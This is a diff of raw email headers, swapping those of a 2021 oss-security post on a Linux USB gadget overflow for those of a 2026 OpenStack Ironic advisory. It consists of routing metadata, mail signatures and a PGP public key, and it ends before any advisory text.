@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["17558" "Wednesday" "15" "December" "2021" "22:22:33" "+0100" "Szymon Heidrich" "szymon.heidrich@gmail.com" nil "351" "[oss-security] CVE-2021-39685 : Linux Kernel USB Gadget buffer overflow" nil nil nil "12" nil nil (number mark "U       szymon.heidr Dec 15  351/17558 " thread-indent "\"[oss-security] CVE-2021-39685 : Linux Kernel USB Gadget buffer overflow\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2021-39685 : Linux Kernel USB Gadget buffer overflow" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 4054 invoked by uid 550); 15 Dec 2021 21:44:57 -0000
+Received: (qmail 1687 invoked by uid 550); 3 Jun 2026 16:51:50 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,394 +7,380 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 21537 invoked from network); 15 Dec 2021 21:22:50 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20210112;
-        h=message-id:date:mime-version:user-agent:content-language:from
-         :subject:to:cc;
-        bh=FsmnOoqiA//GG97UCNOUC3Avep7xwrO/tTM1YxMz4GU=;
-        b=MhsS5vcUXTOuCkV/32yLqpZNn9SoKCNWm0QfrKKwQzr+qA4rf8egfkCWMMr3Te8LRg
-         +huGAx48d/YZbayr3MMnbXTy5GHiuBKCEQDIJXsoUfJfnlPRYcbKCq5Vaf74Vj0Lo6Wv
-         JGOEpMGPqr95mq4Py/2cAi1dz2w2UWBuZE4w4VST2ZtAMMFbhk+/dvBNSRvdSuJc7lxg
-         7c834Mzz3zk/wh8QVDpRA4pB2b9up9GilKtuqnKyTG9hsdBtwW75PWzPWF/qz6vDrgcW
-         0uw1AVIPkvmfgQ+3jQh1+QH4sayuMo9rqD1cTUSjR9Xmet30PDGD9qcrdbsU5M3UZB/K
-         xHXQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20210112;
-        h=x-gm-message-state:message-id:date:mime-version:user-agent
-         :content-language:from:subject:to:cc;
-        bh=FsmnOoqiA//GG97UCNOUC3Avep7xwrO/tTM1YxMz4GU=;
-        b=yHcOIcI/+klOBg6GCl8SHuL7SOO26BBdZetObo9nwtEc5t3BQGCG3Tzor/XkyF8MAD
-         fkg9t57en5ynOn0Ma+A7KQfh7FGUovreyWKntHO31mM75qCZzbLO+1SKoSud4k7GGm7q
-         dwiDlLbvb9548AMhQO6HK0E0MMaQGELgk7KVHVHGaijoadCMQUkTQGrjyTy77vyeGySC
-         ZZrRZ/Nl78Vne8gWyfx8psoqCWTqmFLyUF9faXYRQIhBe1kSU+PysVyUXcw7EYGHhqTA
-         sVoZWTukqeG4CApMW76YFUV/kXT/3RW1CwTTDKcwFuw6Vr6tFKOQ0YbGbB7MMvSfNFX8
-         ZDMw==
-X-Gm-Message-State: AOAM5306NafapgYgDniFdMfdsTfCg7q1uXCxfXGl4DwKwzqlb18fWsKc
-	GrHR7yAmiC3pAGCXLxGKxIhxOl4qqM3eZQ==
-X-Google-Smtp-Source: ABdhPJw94nElkSHGnBTpUGhpDFYVoHKfN8GyAjF5nG5XLNAB81Ndma0A/8KEOCY/Rb0Jycm+c3UAYA==
-X-Received: by 2002:a2e:7805:: with SMTP id t5mr11816525ljc.507.1639603358790;
-        Wed, 15 Dec 2021 13:22:38 -0800 (PST)
-Content-Type: multipart/mixed; boundary="------------ij6TTlDZPiBme4myj3pEvvaH"
-Message-ID: <942e362d-2a16-883f-5ff9-a466ee6202f8@gmail.com>
-Date: Wed, 15 Dec 2021 22:22:33 +0100
-MIME-Version: 1.0
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0)
- Gecko/20100101 Thunderbird/91.4.0
+x-ms-reactions: disallow
+Received: (qmail 7922 invoked from network); 3 Jun 2026 16:29:26 -0000
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
+ b=kv6ryzSEHK/LlPL5cLbU42TwePS1Y1Lc6OScP2Hv7TlwcFVty57ChyK9WFXb4NbJLBzKtbHDBIPLjMjbwRLkjcqJakgdc5CuS5LNZtTwMhMD0dJdtG5Lae9TSEXhNKrAtl9K1fmroKglzcIM48F7Mjki40KyPSZ5jFxGoQ9nFKa06fIOwpUCK6kmZ3FzJ5GEMDzs3I2Ke7W44S9d8nlwXhL39C1kD0wJc+HmcCkIyDVcf3HgZXFkjlpg04LZRFr7CvkoQtDB7XSTzoojJnYEPLUExJYjGvx3eAxlqGkULR1NZ/GnjXXPmyHZk8U3jaxWSZ9wbX7FAYy80r839jQC+Q==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector10001;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=ERg4Mmh8WOud6eSlmI/CFZ10ajXq8XQeET80M26Jqd0=;
+ b=uEVxyOgdQV+4ym+g/01w5LSL3+ukL072lRXVmbrkC6uc83jXxuOzMUlRJNaJpy6rbYZ/zUPJAVSRKEzmwWmytEwrGE49dNBb8Xbt+9tvX+oAx9toYD2awjvfj+dT0Y/tWwE0KZBnXo4ReJSy09mcdSY/bb/B9aezDHLHpfov0q9m91rPB5p1wmhDZt3gx9VEtYWTD15sQ1JKs/Gqe47GiDec1zFoLLWzSCRG/DGYYI3hy5ToFCRCxSuO0Zu4Gg8Pziie1/zCtiYyyONTYekdKRVNOY4PYYq1E5Mz09gi70uuIucOCMhgbBXBV1mZG/qye2NFFH4vAr3/KcVeKJYHVw==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
+ smtp.mailfrom=jvf.cc; dmarc=pass action=none header.from=jvf.cc; dkim=pass
+ header.d=jvf.cc; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=jvf.onmicrosoft.com;
+ s=selector2-jvf-onmicrosoft-com;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=ERg4Mmh8WOud6eSlmI/CFZ10ajXq8XQeET80M26Jqd0=;
+ b=lFQ1Fm2QKtJxDtMhXOofjMkLTY2+IXB5ezDQBCjCCLaukBNWppvumSUyWwqBwxfZHioVS55NdBwp5YjqRuXsUxCGWGPMCkwnuR14ASAEx340ZwPEYX1UX26x9g0rFG60yruzjQs4IETnFf47izLWxcxnLfk6u1GU50MRWL6dSyU=
+Authentication-Results: dkim=none (message not signed)
+ header.d=none;dmarc=none action=none header.from=jvf.cc;
+Message-ID: <f8e1b8e1-874a-4bc2-b0b2-5ac43cd3758a@jvf.cc>
+Date: Wed, 3 Jun 2026 09:29:13 -0700
+User-Agent: Mozilla Thunderbird
 Content-Language: en-US
-From: Szymon Heidrich <szymon.heidrich@gmail.com>
 To: oss-security@lists.openwall.com
-Cc: Greg KH <greg@kroah.com>
-Subject: [oss-security] CVE-2021-39685 : Linux Kernel USB Gadget buffer overflow
+From: Jay Faulkner <jay@jvf.cc>
+Autocrypt: addr=jay@jvf.cc; keydata=
+ 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
+Content-Type: multipart/signed; micalg=pgp-sha256;
+ protocol="application/pgp-signature";
+ boundary="------------EXc6fZAy02UVaSfnoSY8t06A"
+X-ClientProxiedBy: BY3PR10CA0030.namprd10.prod.outlook.com
+ (2603:10b6:a03:255::35) To CO6PR19MB5340.namprd19.prod.outlook.com
+ (2603:10b6:303:137::10)
+MIME-Version: 1.0
+X-MS-PublicTrafficType: Email
+X-MS-TrafficTypeDiagnostic: CO6PR19MB5340:EE_|PH7PR19MB7099:EE_
+X-MS-Office365-Filtering-Correlation-Id: 5650e8f0-dc98-47d4-1862-08dec18d400d
+X-MS-Exchange-SenderADCheck: 1
+X-MS-Exchange-AntiSpam-Relay: 0
+X-Microsoft-Antispam:
+	BCL:0;ARA:13230040|376014|366016|6049299003|10070799003|19092799006|1800799024|56012099006|6133799003|18002099003|4133799003|4053099003;
+X-Microsoft-Antispam-Message-Info:
+	+FKQ6yJYJCc8VIDB7nacZU7Vpj6m5TwzJIOrm3KNpYrdhOWqEZKz7PvcGkkFelJMaNqLyJ3zrCGBS3UQdbDK0hTiquPXmfHWXUA7Ygp79+hZOTgjoBbapmGlazH/fSfeZuRudTjDQP+RVJ9rMbhPbokopDoxCj7cVj+CncA0gBKb3UH02yfqRUHVdSzLIO8hAM1EbI/pyNzD2Fy2mq30r5wcYYhM5Xhxvel5RO2AJv4ET2mLdWv3KtcOWtQ0eQ1kpRKGt2zHCZZFa52ckUWismdvDWEjpiRg3qaFDE8ZIuC9BYIVaqxhI79qefe4SnKX4QUkg0Ayr0VR6i6a9uIALphszTxD8bQC/7yrE71Kp5Idnyox4cKh9fxFil0LmULWq4M9jWPJ/2EIo7M4Ig8G1dJE4uv/9iFQOdmUa+svA7slHzmLQqI0Mo209mGtrIA7MhSJHpNcy5ci8zkYVZr9Zmfq6RG9NUgObBO2r+ALvUB+HpNGSQHcGYTsJM98sg0QPrEur8AM0tCFvtTvto07jiJxuBgHHnq4XRfsUs1JggWX65RSD9TMlmNeNZRa9+CEEUen+bD7aWCQHQtMGYJDVo8mHOI/MG/gcZ98m9Ird0SwmXgi+Vq247uSeZhDh6SL6WDWoznJZOq+JR2KCgrd4g==
+X-Forefront-Antispam-Report:
+	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:CO6PR19MB5340.namprd19.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(376014)(366016)(6049299003)(10070799003)(19092799006)(1800799024)(56012099006)(6133799003)(18002099003)(4133799003)(4053099003);DIR:OUT;SFP:1102;
+X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
+X-MS-Exchange-AntiSpam-MessageData-0:
+	=?utf-8?B?WlRLdlRPWUFMN1VTYmtCcDRCMWVWc0E2S3YvLzIyRGl0b1orelJUSTBsbmFB?=
+ =?utf-8?B?ZmhxQmVKWnNKRnRpaWdNNFl5Z2R3eHpzc0hPekJsamRTNW9MZGRzTzVLTE82?=
+ =?utf-8?B?aDRzZytkMVkzVDFsNm9BU2p1V2lzNXhYU2dhcXJ4WjllaVVEV0NPSU9WUmJF?=
+ =?utf-8?B?czE1VjFvbDBqV1Q4em5RbExYTkd5UkhGTXVlc3lNYksxU2lmNjNabmQ5YTlq?=
+ =?utf-8?B?WTg1SHJHeDQ3TUFhbUFXNVY5dGY2RGpnZWg3N1JBeHZnZSt0eWYxWmw3UVRy?=
+ =?utf-8?B?d1R4Mm1NVm95TlRoTmdPTzhFUzVGWkI4ME9obmNIQ2poSWpnUnJkbXR4M08y?=
+ =?utf-8?B?c050ak9CWFgvUVFkK0E2cWUvT2gvTGdyeHZHN0dhWEkvUitiK2hyWnJCa0tx?=
+ =?utf-8?B?eU1DanREdnN5UkRtMVp5MDl1M2ZaZ2xwdGxRK2l2ZnRqM0MwcmNvRmpjb2JO?=
+ =?utf-8?B?Rk9HZnNRaTU1c0Q3NUJMY1dyWmhESExSalAxSUUwVDRYZXljWUU1SkFBcVhv?=
+ =?utf-8?B?d2dqcWE1QmUramlyNUkrdkIranVMNnV3dGlJTW85Qk14blZQWnVvb2xUNm9R?=
+ =?utf-8?B?VjlGVGwyUXhySkJuZld1R2p3R25hRVNOaHJ2NStyYWpUMEV0RStBMVFlOGpN?=
+ =?utf-8?B?NFBLQ3hPTkJUdlRIYlF2cXJZTFYvLzRuQjRQdDFLNWJ4ZGhZd0NjRFNGbTZY?=
+ =?utf-8?B?UHJLRTZvbko3dzFCWUhURmVhZEJpa2RLZklNaXJTb3NNeVhkZXkxL0ZEOUJS?=
+ =?utf-8?B?LzRQdkFaUWRGYm16ZURhY29tZGZpQVBqbDBaTURYN2ZDNnFDNTU5czJUNEtZ?=
+ =?utf-8?B?eGUydXVORFBITVNYWWtlOWJiUUxMc2luM1UvV0gzRndCZUJkbGtkLzdOUnRl?=
+ =?utf-8?B?ZDNhMjhWQXlOeWRwM3RhQURMR2ZreEROeUcvN1NweFZlMzZYbmxuZGZXK09h?=
+ =?utf-8?B?RTFtdHJMR3RSRGJQQTFuTDZKSlI1VWR2dnRVSkp0L29qREhLUGVkZGZIbU9r?=
+ =?utf-8?B?dCtEdXdFQVlmbWthSm5DbTlJVEtkYURSZnVhS2RIR0ZkcERlNWlmMnJqK3hw?=
+ =?utf-8?B?SG5HT1lxM28vZlJhc0JYdFpCVVN6YWo5b0FoRWJ2d0E1Uk5RWk53S0NVWWFo?=
+ =?utf-8?B?OTljREJ1eEhRbml5cGVVbjN5MXM5dzYyYkpkN21tTHA1YUdCR1YxUG4wT1hw?=
+ =?utf-8?B?aDlnMjU3Um15ZlJmMXZQbWZUWHlrYU43S0hpOWpEa29sSWxRdElaNnRJa3lq?=
+ =?utf-8?B?dmFkMTZrcFRXak4wT3NGWHZZNVpNc2Jnb1RydTBWM05Hck1FSzN2UDZpN2lZ?=
+ =?utf-8?B?ejRuNmR6MS9XZUZCKzcxR1M4ellkeTlCMlBBVlBoMVBqTlFOYlNkQ2JJc3hs?=
+ =?utf-8?B?SWwzUmExamVFSFk1NzUvODRHWjdjQmRqT0xtUjdTT3ZGME1DY1RtYU55Z29l?=
+ =?utf-8?B?clRFdEE4U2VPeEM0dHFrNlY1aWJSTnlxUzVGd3pIaGV1L1FGRDZYNzUwNWZp?=
+ =?utf-8?B?V3Y2UjV6TUdWMHphZHhVcE9pNmxoSEUxRnZxTllUeXROVEIyM29ZNTI5Mjkx?=
+ =?utf-8?B?ZzN6NFc0Nkp1K1pCSkFUOUY4Uzh6N2RtRVVUOU1ubUF1VjBGZ0plU2VxSTN6?=
+ =?utf-8?B?ZmcySTRITUdHRVp0c25oTmgweTcyU21JendGekhKcWI2S1gwaFRMMlBHczE4?=
+ =?utf-8?B?MWNrSGsyNWwrWHNaaUtjRnZJd1lISmk3TEVMWVVSZUFmaVl3TElpcEtQS0oy?=
+ =?utf-8?B?aHZTSE1PbnBNeEdqTjN2eHp4TjBXb042RDgzRndoaTdERTB3T2hWN2V1Wm5p?=
+ =?utf-8?B?R2hsT3FGSkpYdS82SHlaaElxZUpzU3BUcXNlMFYxS0RHTWNjL25OUk5aQmFU?=
+ =?utf-8?B?S1FDRGpzekFibW9FOXBnKzJaRm03Snljb2NJaUxHanV2U1N1QXZHS1diQmtW?=
+ =?utf-8?B?ZmYzV1o5RmViTkZBL1p5Q0NLSUFXcVo4eVNaVGFza3FRM1F3NU4zd3hCV2R6?=
+ =?utf-8?B?T1h6aFQxVFVVblpaYlAxbGZDb0grUU1jUEVmMEQ4dTkwVDJxcW5IMmhZcnY5?=
+ =?utf-8?B?NmYxaUxZYS9OK2ZodTFZZk1RR2w1ZmJzQVg5ZVVZMWlUdmtEQkRWMW5XZmMr?=
+ =?utf-8?B?WnR4RFcyNGJQbjFyRFBjS1FGb0ZvSHZPbGU4NlNCdmh2N1hjSXJGditFM3Bs?=
+ =?utf-8?B?ZnFjNjY3NHduRmh4c1BaZWZMdGZWM1NBb3dpOE0zekVCVGQ4ZHVVS01GNWgr?=
+ =?utf-8?B?ZzlzTit4RUo4NzRFNTBTNWQ4cDJ3ZG0xemZZQ2NndVZmcC8yK0t4MmNUNVRv?=
+ =?utf-8?B?VkxFRHVkUzBsc0ZYaktJZEVWM0NKYTZQSkR4Qkcya2k2aWF3VXorL0F1Z0da?=
+ =?utf-8?Q?gx/vsarvTNGSsZNPH2k/AfW2psVHBgJl+bTxT?=
+X-OriginatorOrg: jvf.cc
+X-MS-Exchange-CrossTenant-Network-Message-Id: 5650e8f0-dc98-47d4-1862-08dec18d400d
+X-MS-Exchange-CrossTenant-AuthSource: CO6PR19MB5340.namprd19.prod.outlook.com
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 03 Jun 2026 16:29:14.3416
+ (UTC)
+X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
+X-MS-Exchange-CrossTenant-Id: 3268b97a-2d09-45a8-9816-8dea1f44039e
+X-MS-Exchange-CrossTenant-MailboxType: HOSTED
+X-MS-Exchange-CrossTenant-UserPrincipalName: hUqLePPKJqbZbJrGkFVMxPkHNH6kZb9/0ddUyGkytdgrWw3cz/fTLf9IdyhV7TsA
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: PH7PR19MB7099
+Subject: [oss-security] [OSSA-2026-019] Ironic: File Extraction from conductor via
+ pxe_template (CVE-2026-44917)
 
---------------ij6TTlDZPiBme4myj3pEvvaH
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
+--------------EXc6fZAy02UVaSfnoSY8t06A
+Content-Type: multipart/mixed; boundary="------------85900kXHvSXpfJ4CQ2jKwslx";
+ protected-headers="v1"; hp="clear"
+Message-ID: <f8e1b8e1-874a-4bc2-b0b2-5ac43cd3758a@jvf.cc>
+Date: Wed, 3 Jun 2026 09:29:13 -0700
+MIME-Version: 1.0
+User-Agent: Mozilla Thunderbird
+Content-Language: en-US
+To: oss-security@lists.openwall.com
+From: Jay Faulkner <jay@jvf.cc>
+Subject: [OSSA-2026-019] Ironic: File Extraction from conductor via
+ pxe_template (CVE-2026-44917)
+Autocrypt: addr=jay@jvf.cc; keydata=
+ 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
